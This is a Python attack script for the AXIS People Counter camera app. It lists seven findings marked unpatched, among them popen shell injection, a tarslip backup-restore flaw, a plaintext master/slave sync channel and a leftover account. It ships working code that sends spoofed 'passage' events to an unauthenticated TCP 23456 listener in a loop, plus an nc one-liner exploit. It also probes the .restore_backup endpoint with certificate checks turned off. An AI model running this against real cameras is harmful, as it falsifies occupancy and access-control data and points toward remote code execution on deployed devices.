"""
AXIS People Counter (tvpc) — RE findings
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS People Counter (tvpc), appId 211490
Versions: 4.6.110 (aarch64), 4.0.0 (aarch64 S5L)
Arch: aarch64 ELF stripped

Key surfaces:
  - popen() with format strings from axparameter: shell injection RCE (operator-level)
  - .restore_backup CGI: tarslip; license override + cert injection (operator-level)
  - TCP 23456: unauthenticated passage event injection from LAN
  - TCP 4066: master/slave sync MITM; DPID-based identity (no crypto)
  - privacy.sh: bind mount over /etc/actionengine/user/1/ (operator/admin)
  - TrueviewVAPIX legacy VAPIX account (4.0.0 only — not removed)
  - SlavePass in params.meta: exported plaintext in pre-4.6.110 builds

Also covers AXIS People Counter 4.0.0 (S5L variant) specific findings:
  TrueviewVAPIX account not removed; TLS not verified on restart curl.
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import socket
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

FINDING = "AXIS-PC"
LABEL = "AXIS People Counter (tvpc) attack surface"

FINDINGS = [
    {
        "id": "AXIS-PC-01",
        "severity": "CRITICAL",
        "title": "Shell injection via VAPIX curl command format strings (operator)",
        "detail": (
            "tvpc calls popen() with: "
            "'CURL_CA_BUNDLE=... /usr/local/packages/tvpc/curl -L -f --anyauth --insecure "
            "%s --user %s:%s \"%s/axis-cgi/opticscontrol.cgi\"' "
            "The %s slots are extra_flags, user, password, base_url — all from axparameter. "
            "Operator-level write to any of these params injects shell metacharacters "
            "into the popen() command string -> RCE as ACAP process user."
        ),
        "cgi": ".apioperator (operator-level config write)",
        "impact": "RCE as ACAP process user; pivot to camera root via SUID/ACAP paths",
        "severity_detail": "CRITICAL — operator-level auth sufficient",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-02",
        "severity": "HIGH",
        "title": "Backup restore: license override + cert injection via .restore_backup",
        "detail": (
            ".restore_backup operator CGI unpacks /tmp/backup/. "
            "'cp /tmp/backup/licbackup.xml /usr/local/packages/tvpc/lic.xml' — license override. "
            "'cp /tmp/backup/pems/*.pem /usr/local/packages/tvpc/localdata' — cert injection. "
            "Attacker controls archive content via multipart upload."
        ),
        "cgi": "/people-counter/.restore_backup (operator)",
        "impact": "License bypass (lic.xml swap) + TLS cert injection; auth bypass chain",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-03",
        "severity": "HIGH",
        "title": "Unauthenticated people-count injection via TCP 23456",
        "detail": (
            "Counter0EventListenerPort=23456 (default) binds a TCP listener for passage events. "
            "No authentication confirmed in binary strings. "
            "Any LAN host can inject passage events -> spoof occupancy data, "
            "trigger false access control decisions."
        ),
        "exploit": "echo 'passage' | nc <camera_ip> 23456",
        "prerequisite": "Network access to camera LAN",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-04",
        "severity": "MEDIUM",
        "title": "Master/slave sync MITM on TCP 4066",
        "detail": (
            "Counter0SlavePort/Counter0MasterPort default 4066; unencrypted TCP. "
            "Peer identity via DPID string, not cryptographic challenge. "
            "'DPID: duplicate peer identity - disconnecting peer' confirms DPID is the auth mechanism. "
            "MITM the 4066 channel -> inject false people-count data to slave cameras."
        ),
        "prerequisite": "Network position between master and slave cameras",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-05",
        "severity": "MEDIUM",
        "title": "Privacy anonymization bind mount over action engine directory",
        "detail": (
            "modules/anon-gui/anon/privacy.sh: 'mount --bind $OVERRIDE_FOLDER $EVENT_FOLDER'. "
            "If $OVERRIDE_FOLDER is user-controlled (via ACAP config or operator CGI), "
            "attacker bind mounts arbitrary directory over /etc/actionengine/user/1/, "
            "overwriting Axis action engine event handlers."
        ),
        "prerequisite": "Operator/admin level; triggered by anonymization mode toggle",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-06",
        "severity": "LOW",
        "title": "Open redirect in request-failure.html fallback",
        "detail": (
            "apache.conf: RewriteRule redirects to /request-failure.html?redirector=$4 "
            "when tvpc web process is not running (/tmp/tvpc-web-running absent). "
            "Attacker-controlled redirector param -> phishing redirect from camera hostname."
        ),
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-PC-07",
        "severity": "CRITICAL",
        "title": "TrueviewVAPIX legacy VAPIX account on 4.0.0 cameras",
        "detail": (
            "tvpc 4.0.0 (S5L variant) does NOT remove the TrueviewVAPIX VAPIX account "
            "in postinst.sh (removal added in 4.6.110). "
            "Any 4.0.0 camera may have this account active with default or guessable password. "
            "TrueviewVAPIX is operator-level -> VAPIX API access -> camera control."
        ),
        "affected": "tvpc 4.0.0 S5L variant only",
        "status": "UNPATCHED",
        "cve": None,
    },
]


def probe_tcp_listener(host: str, port: int = 23456, payload: bytes = b"passage\n", timeout: int = 5) -> dict:
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(payload)
            try:
                data = s.recv(1024)
            except socket.timeout:
                data = b""
            return {"open": True, "response": data.decode("utf-8", errors="replace"), "payload_sent": payload.decode()}
    except (ConnectionRefusedError, OSError) as e:
        return {"open": False, "error": str(e)}


def inject_passage_events(host: str, port: int = 23456, count: int = 10, timeout: int = 5) -> list[dict]:
    results = []
    for i in range(count):
        r = probe_tcp_listener(host, port, b"passage\n", timeout)
        r["event_number"] = i + 1
        results.append(r)
        if not r["open"]:
            break
    return results


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _basic_auth(user: str, password: str) -> str:
    import base64
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def check_restore_backup(host: str, port: int, user: str, password: str, timeout: int = 15) -> dict:
    url = f"https://{host}:{port}/people-counter/.restore_backup"
    headers = {"Authorization": _basic_auth(user, password)}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            return {"status": r.status, "accessible": True}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "accessible": e.code != 401}
    except Exception as e:
        return {"status": None, "accessible": False, "error": str(e)}


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    parser.add_argument("host")
    parser.add_argument("--port", type=int, default=443)
    parser.add_argument("--user", default="root")
    parser.add_argument("--password", default="")
    parser.add_argument("--tcp-probe", action="store_true", help="Probe TCP 23456 event listener")
    parser.add_argument("--tcp-port", type=int, default=23456)
    parser.add_argument("--inject-count", type=int, default=5, help="Number of passage events to inject")
    parser.add_argument("--check-restore", action="store_true", help="Check .restore_backup accessibility")
    args = parser.parse_args()

    print(f"[{FINDING}] {LABEL}")
    print(f"  Target: {args.host}")
    print()

    if args.tcp_probe:
        print(f"  Probing TCP {args.tcp_port} (passage event listener)...")
        r = probe_tcp_listener(args.host, args.tcp_port)
        if r["open"]:
            print(f"  [OPEN] TCP {args.tcp_port} accessible — event injection possible")
            print(f"  Response: {r['response'][:200]}")
        else:
            print(f"  [CLOSED] TCP {args.tcp_port}: {r.get('error','')}")

        if args.inject_count > 1:
            print(f"\n  Injecting {args.inject_count} passage events...")
            results = inject_passage_events(args.host, args.tcp_port, args.inject_count)
            ok = sum(1 for r in results if r["open"])
            print(f"  {ok}/{args.inject_count} events delivered")

    elif args.check_restore:
        r = check_restore_backup(args.host, args.port, args.user, args.password)
        status = "ACCESSIBLE" if r["accessible"] else "BLOCKED"
        print(f"  [{status}] .restore_backup: HTTP {r.get('status','?')}")
    else:
        print("  Findings summary:")
        for f in FINDINGS:
            print(f"  [{f['severity']:8}] {f['id']}: {f['title']}")
